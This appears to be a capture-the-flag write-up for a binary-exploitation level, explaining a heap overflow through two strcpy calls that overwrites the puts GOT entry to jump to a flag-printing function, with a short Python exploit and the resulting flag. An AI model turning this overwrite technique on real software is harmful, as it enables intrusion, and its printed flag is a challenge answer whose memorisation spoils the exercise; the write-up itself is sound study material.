@@ -1,0 +1,33 @@
+In this binary, we can see a global variable `c` that will contain our flag.
+
+There are 2 malloc'ed pointers that will respectively receive argv[1] and
+argv[2].
+
+At the end of the file, there is a dummy `puts` function call.
+Maybe we can use a ROP (Return-Oriented Programming) attack.
+
+There are 2 strcpy() function calls.
+On the first one, we can overflow with the goal to overwrite the 1st argument in
+the 2nd strcpy() function call. The point is, if we change the argument of
+strcpy(), we can overwrite anything.
+
+Since the strcpy() function calls are executed before reading the flag, the only
+address that is interesting to overwrite is the puts() function call.
+
+Instead of calling puts function call, we can call m function. That prints out
+the flag.
+
+```python
+#! /usr/bin/env python
+
+PAD     = "A"*20
+DEST    = "\x28\x99\x04\x08"
+M_ADDR  = "\xf4\x84\x04\x08"
+
+print PAD + DEST + " " +  M_ADDR
+```
+
+```bash
+./level7 $(python exploit.py)
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
